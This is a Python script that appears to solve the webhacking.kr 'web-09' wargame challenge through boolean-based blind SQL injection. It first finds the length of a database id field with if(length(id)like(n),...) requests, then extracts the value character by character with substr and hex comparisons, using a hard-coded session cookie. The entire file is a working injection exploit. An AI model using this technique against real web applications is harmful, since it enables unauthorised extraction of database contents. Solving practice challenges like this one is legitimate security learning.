import requests 

headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) \AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117'}
cookies = {'PHPSESSID':'1plfje78cfg4142vhfrt3l4lon'}
keywords = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'

def HttpRequest(num, text): 
    id_length = 0 
    result = ''
    for i in range(1, 20):
        url='https://webhacking.kr/challenge/web-09/index.php?no=if(length(id)like({}),{},404)'.format(i,num)
        res = requests.get(url, headers=headers, cookies=cookies)
        if text in res.text: 
            id_length = i
            print('no {}\'s id length: {}'.format(num, i))
            break 
    
    for i in range(1, id_length + 1):
        for key in keywords: 
            url = 'https://webhacking.kr/challenge/web-09/index.php?no=if(substr(id,{},1)like({}),{},404)'.format(i, hex(ord(key)), num)
            res = requests.get(url, headers=headers, cookies=cookies)
            if text in res.text: 
                result += key
                break 
    
    print("no {}\' id: {}".format(num, result))

if __name__== '__main__':
    HttpRequest(3, "Secret")



